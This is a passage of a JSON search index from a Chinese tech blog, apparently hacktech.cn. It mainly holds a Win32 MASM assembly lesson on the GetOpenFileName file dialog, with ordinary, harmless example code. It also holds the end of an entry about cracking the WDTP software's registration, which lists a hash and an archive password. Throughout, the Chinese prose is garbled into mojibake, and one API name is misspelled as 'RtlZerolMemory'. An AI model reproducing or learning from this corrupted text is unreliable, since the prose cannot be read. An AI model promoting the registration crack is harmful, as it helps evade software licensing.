B282AC870E4159A2ACEA389015FE4F4409A0F887 CRC32: F51675CE å¯†ç ï¼šh7b4ru\n","permalink":"https://www.hacktech.cn/post/wdtp-crack.html","summary":"\u003cp\u003eä»Šå¤©æ¥è®²è®²WDTPè¿™ä¸ªè½¯ä»¶çš„ç ´è§£ã€‚\u003c/p\u003e\n\u003ch2 id=\"ç®€ä»‹\"\u003eç®€ä»‹\u003c/h2\u003e\n\u003cp\u003eWDTP ä¸æ­¢æ˜¯ä¸€æ¬¾å¼€æºå…è´¹çš„ GUI æ¡Œé¢å•æœºç‰ˆé™æ€ç½‘ç«™ç”Ÿæˆå™¨å’Œç®€å•æ–¹ä¾¿çš„å‰ç«¯å¼€å‘å·¥å…·ï¼Œæ›´æ˜¯ä¸€æ¬¾è·¨å¹³å°çš„é›†ç¬”è®°ã€ä¸ªäººçŸ¥è¯†ç®¡ç†ã€å†™ä½œ/åˆ›ä½œã€åšå®¢/ç½‘ç«™å†…å®¹ä¸æ ·å¼ç®¡ç†ç­‰åŠŸèƒ½äºä¸€ä½“çš„å¤šåˆä¸€å†…å®¹å¤„ç†/ç®¡ç†å™¨ï¼ŒåŒæ—¶è¿˜æ˜¯ä¸€æ¬¾é«˜åº¦è¿½æ±‚ç”¨æˆ·ä½“éªŒä¸è®¡ç®—æœºæ–‡æœ¬ç¼–å†™è‰¯å¥½æ„Ÿå—çš„ Markdown ç¼–è¾‘å™¨ã€‚è¯¥è½¯ä»¶ç ”å‘çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šç®€æ´é«˜æ•ˆã€è½»çµä¼˜é›…ã€å…ˆè¿›å¼ºæ‚ã€æ“ä½œç®€å•ã€‚\u003c/p\u003e","title":"WDTPæ³¨å†Œç ´è§£"},{"content":" ","permalink":"https://www.hacktech.cn/post/difference-between-dialog-and-window.html","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/8a56d90d62fb6a1ea149f5e4029829fa..png\" alt=\"enter description here\"  /\u003e\n\u003c/p\u003e","title":"å¯¹è¯æ¡†å’Œæ™®é€šçª—å£å·¥ä½œæ–¹å¼çš„åŒºåˆ«"},{"content":"æˆ‘ä»¬å°†è¿›ä¸€æ­¥å­¦ä¹ å¯¹è¯æ¡†ï¼Œæ¢è®¨å¦‚ä½•æŠŠå¯¹è¯æ¡†å½“æˆè¾“å…¥è®¾å¤‡ã€‚å¦‚æœæ‚¨çœ‹äº†å‰ä¸€ç¯‡æ–‡ç« ï¼Œé‚£å°±ä¼šå‘ç°è¿™æ¬¡çš„ä¾‹å­åªæœ‰å°‘é‡çš„æ”¹åŠ¨ï¼Œå°±æ˜¯æŠŠæˆ‘ä»¬çš„å¯¹è¯æ¡†çª—å£é™„å±åˆ°ä¸»çª—å£ä¸Šã€‚å¦å¤–ï¼Œæˆ‘ä»¬è¿˜è¦å­¦ä¹ é€šç”¨å¯¹è¯æ¡†çš„ç”¨æ³•ã€‚\nç†è®ºï¼š æŠŠå¯¹è¯æ¡†å½“æˆä¸€ä¸ªè¾“å…¥è®¾å¤‡æ¥ç”¨ç¡®å®æ˜¯éå¸¸åœ°ç®€å•ï¼Œåˆ›å»ºå®Œä¸»çª—å£åï¼Œæ‚¨åªè¦è°ƒç”¨å‡½æ•° DialogBoxParamæˆ– CreateDialogParam å°±å¯ä»¥äº†ï¼Œå‰ä¸€ä¸ªå‡½æ•°åªè¦åœ¨å¯¹è¯æ¡†çš„è¿‡ç¨‹å¤„ç†å‡½æ•°ä¸­å¤„ç†ç›¸å…³çš„æ¶ˆæ¯å°±å¯ä»¥ï¼Œè€Œåè€…ä½ å¿…é¡»åœ¨æ¶ˆæ¯å¾ªç¯æ®µä¸­æ’å…¥å‡½æ•° IsDialogMessage çš„è°ƒç”¨è®©å®ƒæ¥å¤„ç†é”®ç›˜çš„æŒ‰é”®é€»è¾‘ã€‚å› ä¸ºè¿™ä¸¤ä¸ªç¨‹åºæ®µç›¸å¯¹æ¥è¯´æ¯”è¾ƒå®¹æ˜“ï¼Œæˆ‘ä»¬å°±ä¸è¯¦è§£ã€‚æ‚¨å¯ä»¥ä¸‹è½½å¹¶ä»”ç»†ç ”ç©¶ã€‚ ä¸‹é¢æˆ‘ä»¬æ¥è®¨è®ºé€šç”¨å¯¹è¯æ¡†ã€‚WINDOWSå·²ç»ä¸ºæ‚¨å‡†å¤‡å¥½äº†é¢„å®šä¹‰çš„å¯¹è¯æ¡†ç±»ï¼Œæ‚¨å¯ä»¥æ‹¿æ¥å°±ç”¨ï¼Œè¿™äº›é€šç”¨å¯¹è¯æ¡†æä¾›ç»™ç”¨æˆ·ä»¥ç»Ÿä¸€çš„ç•Œé¢ã€‚å®ƒä»¬åŒ…æ‹¬:æ‰“å¼€æ–‡ä»¶ã€æ‰“å°ã€é€‰æ‹©é¢œè‰²ã€å­—ä½“å’Œæœç´¢ç­‰ã€‚æ‚¨åº”è¯¥å°½å¯èƒ½åœ°ç”¨å®ƒä»¬ã€‚å¤„ç†è¿™äº›å¯¹è¯æ¡†çš„ä»£ç åœ¨comdlg32.dllä¸­ï¼Œä¸ºäº†åœ¨æ‚¨çš„åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨å®ƒä»¬ï¼Œå°±å¿…é¡»åœ¨é“¾æ¥é˜¶æ®µé“¾æ¥åº“æ–‡ä»¶ comdlg32.libã€‚ç„¶åè°ƒç”¨å…¶ä¸­çš„ç›¸å…³å‡½æ•°å³å¯ã€‚å¯¹äºæ‰“å¼€æ–‡ä»¶é€šç”¨å¯¹è¯æ¡†ï¼Œè¯¥å‡½æ•°åä¸º GetOpenFileNameï¼Œ\u0026ldquo;ä¿å­˜ä¸º\u0026hellip;\u0026ldquo;å¯¹è¯æ¡†ä¸º GetSaveFileNameï¼Œæ‰“å°é€šç”¨å¯¹è¯æ¡†æ˜¯ PrintDlgï¼Œ ç­‰ç­‰ã€‚æ¯ä¸€ä¸ªè¿™æ ·çš„å‡½æ•°éƒ½æ¥æ”¶ä¸€ä¸ªæŒ‡å‘ä¸€ä¸ªç»“æ„ä½“çš„æŒ‡é’ˆçš„å‚æ•°ï¼Œæ‚¨å¯ä»¥å‚è€ƒWIN32 APIæ‰‹å†Œå¾—åˆ°è¯¦ç»†çš„èµ„æ–™ï¼Œæœ¬è¯¾ä¸­æˆ‘å°†è®²è§£åˆ›å»ºå’Œä½¿ç”¨æ‰“å¼€æ–‡ä»¶å¯¹è¯æ¡†ã€‚ ä¸‹é¢æ˜¯æ‰“å¼€å¯¹è¯æ¡†å‡½æ•° GetOpenFileName çš„åŸå‹:\n1 GetOpenFileName proto lpofn:DWORD æ‚¨å¯ä»¥çœ‹åˆ°ï¼Œè¯¥å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå³æŒ‡å‘ç»“æ„ä½“OPENFILENAMEçš„æŒ‡é’ˆã€‚å½“ç”¨æˆ·é€‰æ‹©äº†ä¸€ä¸ªæ–‡ä»¶å¹¶æ‰“å¼€ï¼Œè¯¥å‡½æ•°è¿”å›TRUEï¼Œå¦åˆ™è¿”å›FALSEã€‚æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹ç»“æ„ä½“OPENFILENAMEçš„å®šä¹‰:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 OPENFILENAME STRUCT lStructSize DWORD ? hwndOwner HWND ? hInstance HINSTANCE ? lpstrFilter LPCSTR ? lpstrCustomFilter LPSTR ? nMaxCustFilter DWORD ? nFilterIndex DWORD ? lpstrFile LPSTR ? nMaxFile DWORD ? lpstrFileTitle LPSTR ? nMaxFileTitle DWORD ? lpstrInitialDir LPCSTR ? lpstrTitle LPCSTR ? Flags DWORD ? nFileOffset WORD ? nFileExtension WORD ? lpstrDefExt LPCSTR ? lCustData LPARAM ? lpfnHook DWORD ? lpTemplateName LPCSTR ? OPENFILENAME ENDS å¥½ï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹è¯¥ç»“æ„ä½“ä¸­å¸¸ç”¨çš„æˆå‘˜çš„æ„ä¹‰:\nlStructSize ç»“æ„ä½“OPENFILENAMEçš„å¤§å°ã€‚ hwndOwner æ‹¥æœ‰æ‰“å¼€å¯¹è¯æ¡†çš„çª—å£çš„å¥æŸ„ã€‚ hInstance æ‹¥æœ‰è¯¥æ‰“å¼€æ–‡ä»¶å¯¹è¯æ¡†çš„åº”ç”¨ç¨‹åºçš„å®ä¾‹å¥æŸ„ ã€‚ lpstrFilter ä»¥NULLç»“å°¾çš„ä¸€ä¸ªæˆ–å¤šä¸ªé€šé…ç¬¦ã€‚é€šé…ç¬¦æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œå‰ä¸€éƒ¨åˆ†æ˜¯æè¿°éƒ¨åˆ†ï¼Œåä¸€éƒ¨åˆ†åˆ™æ˜¯é€šé…ç¬¦çš„æ ¼å¼ï¼Œè­¬å¦‚: 1 2 FilterString db \u0026#34;All Files (*.*)\u0026#34;,0, \u0026#34;*.*\u0026#34;,0 db \u0026#34;Text Files (*.txt)\u0026#34;,0,\u0026#34;*.txt\u0026#34;,0,0 æ³¨æ„:åªæœ‰æ¯ä¸€å¯¹ä¸­çš„ç¬¬äºŒéƒ¨åˆ†æ˜¯WINDOWSç”¨æ¥è¿‡æ»¤æ‰€éœ€é€‰æ‹©çš„æ–‡ä»¶çš„ï¼Œå¦å¤–æ‚¨å¿…é¡»åœ¨è¯¥éƒ¨åˆ†åæ”¾ç½®ä¸€ä¸ª0ï¼Œä»¥ç¤ºå­—ç¬¦ä¸²çš„ç»“æŸã€‚\nnFilterIndex ç”¨æ¥æŒ‡å®šæ‰“å¼€æ–‡ä»¶å¯¹è¯æ¡†ç¬¬ä¸€æ¬¡æ‰“å¼€æ—¶æ‰€ç”¨çš„è¿‡æ»¤æ¨¡å¼ä¸²ï¼Œè¯¥ç´¢å¼•æ˜¯ä»1å¼€å§‹ç®—çš„ï¼Œå³ç¬¬ä¸€ä¸ªé€šé…ç¬¦æ¨¡å¼çš„ç´¢å¼•æ˜¯1ï¼Œç¬¬äºŒä¸ªæ˜¯2ï¼Œè­¬å¦‚ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œè‹¥æŒ‡å®šè¯¥å€¼ä¸º2ï¼Œåˆ™ç¼ºçœæ˜¾ç¤ºçš„æ¨¡å¼ä¸²å°±æ˜¯\u0026rdquo;*.txt\u0026rdquo;ã€‚ lpstrFile éœ€è¦æ‰“å¼€çš„æ–‡ä»¶çš„åç§°çš„åœ°å€ï¼Œè¯¥åç§°å°†ä¼šå‡ºç°åœ¨æ‰“å¼€æ–‡ä»¶å¯¹è¯æ¡†çš„ç¼–è¾‘æ§ä»¶ä¸­ï¼Œè¯¥ç¼“å†²åŒºä¸èƒ½è¶…è¿‡260ä¸ªå­—ç¬¦é•¿ï¼Œå½“ç”¨æˆ·æ‰“å¼€æ–‡ä»¶åï¼Œè¯¥ç¼“å†²åŒºä¸­åŒ…å«è¯¥æ–‡ä»¶çš„å…¨è·¯å¾„åï¼Œæ‚¨å¯ä»¥ä»è¯¥ç¼“å†²åŒºä¸­æŠ½å–æ‚¨æ‰€éœ€è¦çš„è·¯å¾„æˆ–æ–‡ä»¶åç­‰ä¿¡æ¯ã€‚ nMaxFile lpstrFileçš„å¤§å°ã€‚ lpstrTitle æŒ‡å‘å¯¹è¯æ¡†æ ‡é¢˜çš„å­—ç¬¦ä¸²ã€‚ Flags è¯¥æ ‡å¿—å†³å®šå†³å®šäº†å¯¹è¯æ¡†çš„é£æ ¼å’Œç‰¹ç‚¹ã€‚ nFileOffset åœ¨ç”¨æˆ·æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶åè¯¥å€¼æ˜¯å…¨è·¯å¾„åç§°ä¸­æŒ‡å‘æ–‡ä»¶åç¬¬ä¸€ä¸ªå­—ç¬¦çš„ç´¢å¼•ã€‚è­¬å¦‚:è‹¥å…¨è·¯å¾„åä¸º\u0026quot;c:\\windows\\system\\lz32.dll\u0026quot;ï¼Œ åˆ™è¯¥å€¼ä¸º18ã€‚ nFileExtension åœ¨ç”¨æˆ·æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶åè¯¥å€¼æ˜¯å…¨è·¯å¾„åç§°ä¸­æŒ‡å‘ä¸ªæ–‡ä»¶æ‰©å±•åç¬¬ä¸€ä¸ªå­—ç¬¦çš„ç´¢å¼•ã€‚ ä¾‹å­: ä¸‹ä¾‹ä¸­ï¼Œæˆ‘ä»¬æ¼”ç¤ºäº†å½“ç”¨æˆ·é€‰æ‹©\u0026quot;File-\u0026gt;Open\u0026quot;æ—¶ï¼Œå°†å¼¹å‡ºä¸€ä¸ªæ‰“å¼€æ–‡ä»¶å¯¹è¯æ¡†ï¼Œå½“ç”¨æˆ·é€‰æ‹©äº†æŸä¸ªæ–‡ä»¶æ‰“å¼€æ—¶ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå‘ŠçŸ¥è¦æ‰“å¼€çš„æ–‡ä»¶çš„å…¨è·¯å¾„åï¼Œæ–‡ä»¶åå’Œæ–‡ä»¶æ‰©å±•åã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 .386 .model flat,stdcall option casemap:none WinMain proto :DWORD,:DWORD,:DWORD,:DWORD include \\masm32\\include\\windows.inc include \\masm32\\include\\user32.inc include \\masm32\\include\\kernel32.inc include \\masm32\\include\\comdlg32.inc includelib \\masm32\\lib\\user32.lib includelib \\masm32\\lib\\kernel32.lib includelib \\masm32\\lib\\comdlg32.lib .const IDM_OPEN equ 1 IDM_EXIT equ 2 MAXSIZE equ 260 OUTPUTSIZE equ 512 .data ClassName db \u0026#34;SimpleWinClass\u0026#34;,0 AppName db \u0026#34;Our Main Window\u0026#34;,0 MenuName db \u0026#34;FirstMenu\u0026#34;,0 ofn OPENFILENAME \u0026lt;\u0026gt; FilterString db \u0026#34;All Files\u0026#34;,0,\u0026#34;*.*\u0026#34;,0 db \u0026#34;Text Files\u0026#34;,0,\u0026#34;*.txt\u0026#34;,0,0 buffer db MAXSIZE dup(0) OurTitle db \u0026#34;-=Our First Open File Dialog Box=-: Choose the file to open\u0026#34;,0 FullPathName db \u0026#34;The Full Filename with Path is: \u0026#34;,0 FullName db \u0026#34;The Filename is: \u0026#34;,0 ExtensionName db \u0026#34;The Extension is: \u0026#34;,0 OutputString db OUTPUTSIZE dup(0) CrLf db 0Dh,0Ah,0 .data? hInstance HINSTANCE ? CommandLine LPSTR ? .code start: invoke GetModuleHandle, NULL mov hInstance,eax invoke GetCommandLine mov CommandLine,eax invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT invoke ExitProcess,eax WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD LOCAL wc:WNDCLASSEX LOCAL msg:MSG LOCAL hwnd:HWND mov wc.cbSize,SIZEOF WNDCLASSEX mov wc.style, CS_HREDRAW or CS_VREDRAW mov wc.lpfnWndProc, OFFSET WndProc mov wc.cbClsExtra,NULL mov wc.cbWndExtra,NULL push hInst pop wc.hInstance mov wc.hbrBackground,COLOR_WINDOW+1 mov wc.lpszMenuName,OFFSET MenuName mov wc.lpszClassName,OFFSET ClassName invoke LoadIcon,NULL,IDI_APPLICATION mov wc.hIcon,eax mov wc.hIconSm,eax invoke LoadCursor,NULL,IDC_ARROW mov wc.hCursor,eax invoke RegisterClassEx, addr wc invoke CreateWindowEx,WS_EX_CLIENTEDGE,ADDR ClassName,ADDR AppName,\\ WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\\ CW_USEDEFAULT,300,200,NULL,NULL,\\ hInst,NULL mov hwnd,eax invoke ShowWindow, hwnd,SW_SHOWNORMAL invoke UpdateWindow, hwnd .WHILE TRUE invoke GetMessage, ADDR msg,NULL,0,0 .BREAK .IF (!eax) invoke TranslateMessage, ADDR msg invoke DispatchMessage, ADDR msg .ENDW mov eax,msg.wParam ret WinMain endp WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM .IF uMsg==WM_DESTROY invoke PostQuitMessage,NULL .ELSEIF uMsg==WM_COMMAND mov eax,wParam .if ax==IDM_OPEN mov ofn.lStructSize,SIZEOF ofn push hWnd pop ofn.hwndOwner push hInstance pop ofn.hInstance mov ofn.lpstrFilter, OFFSET FilterString mov ofn.lpstrFile, OFFSET buffer mov ofn.nMaxFile,MAXSIZE mov ofn.Flags, OFN_FILEMUSTEXIST or \\ OFN_PATHMUSTEXIST or OFN_LONGNAMES or\\ OFN_EXPLORER or OFN_HIDEREADONLY mov ofn.lpstrTitle, OFFSET OurTitle invoke GetOpenFileName, ADDR ofn .if eax==TRUE invoke lstrcat,offset OutputString,OFFSET FullPathName invoke lstrcat,offset OutputString,ofn.lpstrFile invoke lstrcat,offset OutputString,offset CrLf invoke lstrcat,offset OutputString,offset FullName mov eax,ofn.lpstrFile push ebx xor ebx,ebx mov bx,ofn.nFileOffset add eax,ebx pop ebx invoke lstrcat,offset OutputString,eax invoke lstrcat,offset OutputString,offset CrLf invoke lstrcat,offset OutputString,offset ExtensionName mov eax,ofn.lpstrFile push ebx xor ebx,ebx mov bx,ofn.nFileExtension add eax,ebx pop ebx invoke lstrcat,offset OutputString,eax invoke MessageBox,hWnd,OFFSET OutputString,ADDR AppName,MB_OK invoke RtlZeroMemory,offset OutputString,OUTPUTSIZE .endif .else invoke DestroyWindow, hWnd .endif .ELSE invoke DefWindowProc,hWnd,uMsg,wParam,lParam ret .ENDIF xor eax,eax ret WndProc endp end start 1 2 3 4 5 6 7 8 9 10 11 ;-------------------------------------------------------------------------------- ;menu.rc ;-------------------------------------------------------------------------------- #define IDM_OPEN 1 #define IDM_EXIT 2 FirstMenu MENU { MENUITEM \u0026#34;\u0026amp;Open\u0026#34;,IDM_OPEN MENUITEM \u0026#34;E\u0026amp;xit\u0026#34;,IDM_EXIT } åˆ†æ: 1 2 3 4 5 mov ofn.lStructSize,SIZEOF ofn push hWnd pop ofn.hwndOwner push hInstance pop ofn.hInstance æˆ‘ä»¬åœ¨æ­¤å¡«å……ç»“æ„ä½“OPENFILENAMEå˜é‡ofnçš„æœ‰å…³æˆå‘˜ã€‚\n1 mov ofn.lpstrFilter, OFFSET FilterString è¿™é‡ŒFilterString æ˜¯æ–‡ä»¶è¿‡æ»¤æ¨¡å¼çš„å­—ç¬¦ä¸²åœ°å€ï¼Œæˆ‘ä»¬æŒ‡å®šçš„è¿‡æ»¤æ¨¡å¼å­—ç¬¦ä¸²å¦‚ä¸‹:\n1 2 FilterString db \u0026#34;All Files\u0026#34;,0,\u0026#34;*.*\u0026#34;,0 db \u0026#34;Text Files\u0026#34;,0,\u0026#34;*.txt\u0026#34;,0,0 æ³¨æ„:æ‰€æœ‰çš„æ¨¡å¼ä¸²éƒ½æ˜¯é…å¯¹çš„ï¼Œå‰ä¸€ä¸ªæ˜¯æè¿°ï¼Œåä¸€ä¸ªæ‰æ˜¯çœŸæ­£çš„æ¨¡å¼ï¼Œæ­¤å¤„*.*å’Œ*.txtæ˜¯WIONDOWSç”¨æ¥å¯»æ‰¾åŒ¹é…çš„æ¬²æ‰“å¼€çš„æ–‡ä»¶çš„ã€‚æˆ‘ä»¬å½“èƒ½å¯ä»¥æŒ‡å®šä»»ä½•æ¨¡å¼ï¼Œä½†æ˜¯ä¸è¦å¿˜è®°åœ¨ç»“å°¾å¤„åŠ 0ä»¥ä»£è¡¨å­—ç¬¦ä¸²å·²ç»“æŸï¼Œå¦åˆ™æ‚¨çš„å¯¹è¯æ¡†åœ¨æ“ä½œæ—¶å¯èƒ½ä¸ç¨³å®šã€‚\n1 2 mov ofn.lpstrFile, OFFSET buffer mov ofn.nMaxFile,MAXSIZE è¿™é‡Œæ˜¯æŠŠç¼“å†²åŒºçš„åœ°å€æ”¾åˆ°ç»“æ„ä½“ä¸­ï¼ŒåŒæ—¶å¿…é¡»è®¾å®šå¤§å°ã€‚ä»¥åæˆ‘ä»¬å¯ä»¥éšæ„ç¼–è¾‘åœ¨è¯¥ç¼“å†²åŒºä¸­è¿”å›çš„ä¿¡æ¯ã€‚\n1 2 3 mov ofn.Flags, OFN_FILEMUSTEXIST or \\ OFN_PATHMUSTEXIST or OFN_LONGNAMES or\\ OFN_EXPLORER or OFN_HIDEREADONLY Flags ä¸­æ”¾å…¥çš„æ˜¯å¯¹è¯æ¡†çš„é£æ ¼å’Œç‰¹æ€§å€¼ã€‚ å…¶ä¸­OFN_FILEMUSTEXISTå’Œ OFN_PATHMUSTEXISTè¦æ±‚ç”¨æˆ·åœ¨æ‰“å¼€å¯¹è¯æ¡†çš„ç¼–è¾‘æ§ä»¶ä¸­è¾“å…¥çš„æ–‡ä»¶åæˆ–è·¯å¾„åå¿…é¡»å­˜åœ¨ã€‚ OFN_LONGNAMES å‘Šè¯‰å¯¹è¯æ¡†æ˜¾ç¤ºé•¿æ–‡ä»¶åã€‚ OFN_EXPLORER å‘Šè¯‰WINDOWSå¯¹è¯æ¡†çš„å¤–è§‚å¿…é¡»ç±»ä¼¼èµ„æºç®¡ç†å™¨ã€‚ OFN_HIDEREADONLY æŒ‡å®šä¸è¦æ˜¾ç¤ºåªè¯»æ–‡ä»¶(æ—¢ä½¿å®ƒçš„æ‰©å±•åç¬¦åˆè¿‡æ»¤æ¨¡å¼)ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰è®¸å¤šå…¶å®ƒçš„æ ‡å¿—ä½ï¼Œæ‚¨å¯ä»¥å‚è€ƒæœ‰å…³WIN32 APIæ‰‹å†Œã€‚\n1 mov ofn.lpstrTitle, OFFSET OurTitle æŒ‡å®šæ‰“å¼€æ–‡ä»¶å¯¹è¯æ¡†çš„æ ‡é¢˜åã€‚\n1 invoke GetOpenFileName, ADDR ofn è°ƒç”¨GetOpenFileNameå‡½æ•°ï¼Œå¹¶ä¼ å…¥æŒ‡å‘ç»“æ„ä½“ofnçš„æŒ‡é’ˆã€‚ è¿™æ—¶å€™ï¼Œæ‰“å¼€æ–‡ä»¶å¯¹è¯æ¡†å°±æ˜¾ç¤ºå‡ºæ¥äº†ï¼ŒGetOpenFileNameå‡½æ•°è¦ä¸€ç›´ç­‰åˆ°ç”¨æˆ·é€‰æ‹©äº†ä¸€ä¸ªæ–‡ä»¶åæ‰ä¼šè¿”å›ï¼Œæˆ–è€…å½“ç”¨æˆ·æŒ‰ä¸‹äº†CANCELé”®æˆ–å…³é—­å¯¹è¯æ¡†æ—¶ã€‚ å½“ç”¨æˆ·é€‰æ‹©äº†æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œè¯¥å‡½æ•°è¿”å›TRUEï¼Œ å¦åˆ™è¿”å›FALSEã€‚\n1 2 3 4 5 .if eax==TRUE invoke lstrcat,offset OutputString,OFFSET FullPathName invoke lstrcat,offset OutputString,ofn.lpstrFile invoke lstrcat,offset OutputString,offset CrLf invoke lstrcat,offset OutputString,offset FullName å½“ç”¨æˆ·é€‰æ‹©æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬å°±åœ¨ä¸€ä¸ªå¯¹è¯æ¡†ä¸­æ˜¾ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å…ˆç»™OutputStringå˜é‡åˆ†é…å†…å­˜ï¼Œç„¶åè°ƒç”¨PAI å‡½æ•°lstrcatï¼ŒæŠŠæ‰€æœ‰çš„å­—ç¬¦ä¸²è¿åˆ°ä¸€èµ·ï¼Œä¸ºäº†è®©è¿™äº›å­—ç¬¦ä¸²åˆ†è¡Œæ˜¾ç¤ºï¼Œæˆ‘ä»¬å¿…é¡»åœ¨æ¯ä¸ªå­—ç¬¦ä¸²åé¢åŠ ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚\n1 2 3 4 5 6 7 mov eax,ofn.lpstrFile push ebx xor ebx,ebx mov bx,ofn.nFileOffset add eax,ebx pop ebx invoke lstrcat,offset OutputString,eax ä¸Šé¢è¿™å‡ è¡Œå¯èƒ½éœ€è¦ä¸€äº›è§£é‡Šã€‚nFileOffsetçš„å€¼ç­‰äºè¢«æ‰“å¼€æ–‡ä»¶çš„å…¨è·¯å¾„åä¸­çš„æ–‡ä»¶åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ç´¢å¼•ï¼Œç”±äºnFileOffsetæ˜¯ä¸€ä¸ªWORDå‹å˜é‡ï¼Œè€ŒlpstrFileæ˜¯ä¸€ä¸ªDWORDå‹çš„æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦ä½œä¸€è½¬æ¢æŠŠnFileOffsetå­˜å…¥ebxå¯„å­˜å™¨çš„åº•å­—èŠ‚ï¼Œç„¶åå†åŠ åˆ°eaxå¯„å­˜å™¨ä¸­å¾—åˆ°DWORDå‹çš„æŒ‡é’ˆã€‚\n1 invoke MessageBox,hWnd,OFFSET OutputString,ADDR AppName,MB_OK æˆ‘ä»¬åœ¨å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºè¯¥å­—ç¬¦ä¸²ã€‚\n1 invoke RtlZerolMemory,offset OutputString,OUTPUTSIZE ä¸ºäº†ä¸‹ä¸€æ¬¡èƒ½æ­£ç¡®åœ°æ˜¾ç¤ºï¼Œå¿…é¡»æ¸…é™¤ç¼“å†²åŒºï¼Œæˆ‘ä»¬è°ƒç”¨å‡½æ•°RtlZerolMemoryæ¥åšè¿™ä»¶äº‹ã€‚\n","permalink":"https://www.hacktech.cn/post/win32-asm-study-11.html","summary":"\u003cp\u003eæˆ‘ä»¬å°†è¿›ä¸€æ­¥å­¦ä¹ å¯¹è¯æ¡†ï¼Œæ¢è®¨å¦‚ä½•æŠŠå¯¹è¯æ¡†å½“æˆè¾“å…¥è®¾å¤‡ã€‚å¦‚æœæ‚¨çœ‹äº†å‰ä¸€ç¯‡æ–‡ç« ï¼Œé‚£å°±ä¼šå‘ç°è¿™æ¬¡çš„ä¾‹å­åªæœ‰å°‘é‡çš„æ”¹åŠ¨ï¼Œå°±æ˜¯æŠŠæˆ‘ä»¬çš„å¯¹è¯æ¡†çª—å£é™„å±åˆ°ä¸»çª—å£ä¸Šã€‚å¦å¤–ï¼Œæˆ‘ä»¬è¿˜è¦å­¦ä¹ é€šç”¨å¯¹è¯æ¡†çš„ç”¨æ³•ã€‚\u003c/p\u003e","title":"Win32æ±‡ç¼–å­¦ä¹ (11)ï¼šå¯¹è¯æ¡†(2)"},{"content":"ç°åœ¨æˆ‘ä»¬å¼€å§‹å­¦ä¹ ä¸€äº›æœ‰å…³GUIç¼–ç¨‹çš„æœ‰è¶£çš„éƒ¨åˆ†ï¼šä»¥å¯¹è¯æ¡†ä¸ºä¸»è¦ç•Œé¢çš„åº”ç”¨ç¨‹åºã€‚\nç†è®ºï¼š å¦‚æœæ‚¨ä»”ç»†å…³æ³¨è¿‡å‰ä¸€ä¸ªç¨‹åºå°±ä¼šå‘ç°ï¼šæ‚¨æ— æ³•æŒ‰TABé”®ä»ä¸€ä¸ªå­çª—å£æ§ä»¶è·³åˆ°å¦ä¸€ä¸ªå­çª—å£æ§ä»¶ï¼Œè¦æƒ³è½¬ç§»çš„è¯åªæœ‰ ç”¨é¼ æ ‡ä¸€ä¸‹ä¸€ä¸‹åœ°å»ç‚¹å‡»ã€‚å¯¹ç”¨æˆ·æ¥è¯´è¿™æ˜¯ä¸å‹å¥½çš„ã€‚å¦ä¸€ä»¶äº‹æ˜¯å¦‚æœæ‚¨è±¡å‰ä¸€è¯¾ä¸­é‚£æ ·æŠŠä¸»çª—å£çš„èƒŒæ™¯è‰²ä»ç™½è‰²æ”¹æˆ ç°è‰²ï¼Œä¸ºäº†å­çª—å£æ§ä»¶æ— ç¼åœ°ä½œç›¸åº”åœ°æ”¹å˜ï¼Œæ‚¨å¿…é¡»ä»”ç»†åˆ†ç±»æ‰€æœ‰å­çª—å£ã€‚ é€ æˆä¸Šè¿°è¯¸å¤šä¸ä¾¿çš„åŸå› æ˜¯å­çª—å£æ§ä»¶æœ¬æ¥æ˜¯ä¸ºå¯¹è¯æ¡†è€Œè®¾è®¡çš„ï¼Œåƒå­çª—å£æ§ä»¶çš„èƒŒæ™¯è‰²æ˜¯ç°è‰²çš„ï¼Œè€Œå¯¹è¯æ¡†çš„èƒŒæ™¯è‰²ä¹Ÿæ˜¯ ç°è‰²çš„ï¼Œè¿™æ ·å®ƒä»¬æœ¬æ¥å°±ç›¸äº’åè°ƒäº†ï¼Œè€Œæ— é¡»ç¨‹åºå‘˜åŠ å…¥å…¶ä»–çš„å¤„ç†ã€‚ åœ¨æˆ‘ä»¬æ·±å…¥è®¨è®ºå¯¹è¯æ¡†å‰æˆ‘ä»¬å¿…é¡»çŸ¥é“ä½•è°“å¯¹è¯æ¡†ã€‚\nä½•è°“å¯¹è¯æ¡† ä¸€ä¸ªå¯¹è¯æ¡†å…¶å®æ˜¯æœ‰å¾ˆå¤šçš„å­çª—å£æ§ä»¶çš„ä¸€ä¸ªçª—å£ï¼ŒWINDOWSåœ¨å¯¹è¯æ¡† 